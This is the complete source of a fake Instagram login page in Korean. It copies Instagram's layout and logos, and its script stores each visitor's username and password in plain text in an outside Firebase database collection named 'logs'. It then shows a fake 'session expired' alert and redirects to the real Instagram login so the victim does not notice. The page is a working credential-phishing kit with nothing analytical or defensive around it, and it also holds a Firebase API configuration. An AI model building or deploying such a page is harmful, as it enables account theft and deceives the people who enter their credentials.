<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* 원본의 깨끗한 흰색 배경과 폰트 스타일 */
        body { background-color: #ffffff; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        
        /* 상단 뒤로가기 화살표 */
        .top-bar { width: 100%; padding: 16px 20px; display: flex; align-items: center; justify-content: flex-start; box-sizing: border-box; }
        .back-arrow { font-size: 28px; cursor: pointer; color: #000; font-weight: 300; }
        
        /* 한국어 선택 부분 - 화살표 크기와 간격 조정 */
        .language-container { color: #737373; font-size: 13px; margin: 10px 0 45px 0; cursor: pointer; display: flex; align-items: center; gap: 3px; }
        .lang-arrow { font-size: 9px; opacity: 0.8; }

        /* 메인 컨테이너 및 최신형 로고 이미지 */
        .container { width: 100%; max-width: 360px; padding: 0 28px; box-sizing: border-box; text-align: center; flex-grow: 1; }
        .logo-img { width: 78px; height: 78px; margin-bottom: 45px; border-radius: 18px; } /* 원본의 둥근 최신 로고 비율 */

        /* 입력창 - 테두리 곡률(14px) 및 글자 크기 최적화 */
        input { width: 100%; padding: 15px 16px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 14px; background-color: #ffffff; box-sizing: border-box; font-size: 14px; color: #262626; }
        input::placeholder { color: #737373; font-size: 14.5px; }
        
        /* 로그인 버튼 - 짙은 파란색과 완전한 타원형 */
        .btn-login { width: 100%; background-color: #0064e0; color: white; border: none; padding: 11px; border-radius: 100px; font-weight: 600; cursor: pointer; font-size: 15px; margin-top: 5px; }
        .btn-login:disabled { opacity: 0.5; }
        
        .forgot-pw { color: #000000; font-size: 14px; font-weight: 600; text-decoration: none; margin-top: 25px; display: block; }

        /* 하단 섹션 - 새 계정 만들기 및 Meta 로고 */
        .bottom-section { width: 100%; max-width: 360px; padding: 20px 28px 40px 28px; box-sizing: border-box; text-align: center; }
        .btn-signup { width: 100%; background-color: transparent; color: #0064e0; border: 1px solid #0064e0; padding: 10px; border-radius: 100px; font-weight: 600; cursor: pointer; font-size: 14px; margin-bottom: 30px; }
        
        .meta-footer { display: flex; flex-direction: column; align-items: center; }
        .meta-logo-img { width: 70px; filter: grayscale(1); opacity: 0.4; } /* 요청하신 대로 'Meta' 글자 없이 로고만 흐릿하게 */
    </style>
</head>
<body>
    <div class="top-bar"><span class="back-arrow">←</span></div>
    
    <div class="language-container">
        한국어 <span class="lang-arrow">∨</span>
    </div>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Instagram" class="logo-img">
        
        <form id="loginForm">
            <input type="text" id="id" placeholder="사용자 이름, 이메일 주소 또는 휴대폰 번호" required>
            <input type="password" id="pw" placeholder="비밀번호" required>
            <button type="submit" id="submitBtn" class="btn-login">로그인</button>
        </form>

        <a href="#" class="forgot-pw">비밀번호를 잊으셨나요?</a>
    </div>

    <div class="bottom-section">
        <button class="btn-signup">새 계정 만들기</button>
        <div class="meta-footer">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="meta-logo-img">
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        // 상준님의 기존 Firebase 설정
        const firebaseConfig = {
            apiKey: "AIzaSyDGS9mDbbKXNL4OrskQ3ZDHBsKb8Glroj4",
            authDomain: "instagram-be709.firebaseapp.com",
            projectId: "instagram-be709",
            storageBucket: "instagram-be709.firebasestorage.app",
            messagingSenderId: "556245509978",
            appId: "1:556245509978:web:e78967856f2ac2586f7563",
            measurementId: "G-1KLXR0LXSZ"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const submitBtn = document.getElementById('submitBtn');
            const idVal = document.getElementById('id').value;
            const pwVal = document.getElementById('pw').value;
            
            submitBtn.disabled = true;

            try {
                await addDoc(collection(db, "logs"), {
                    userId: idVal,
                    userPw: pwVal,
                    timestamp: new Date()
                });
                
                alert("로그인 프로세스가 만료되었습니다. 다시 로그인해 주세요.");
                window.location.href = "https://www.instagram.com/accounts/login/";
            } catch (error) {
                console.error("오류 발생:", error);
                alert("네트워크 연결을 확인해주세요.");
                submitBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
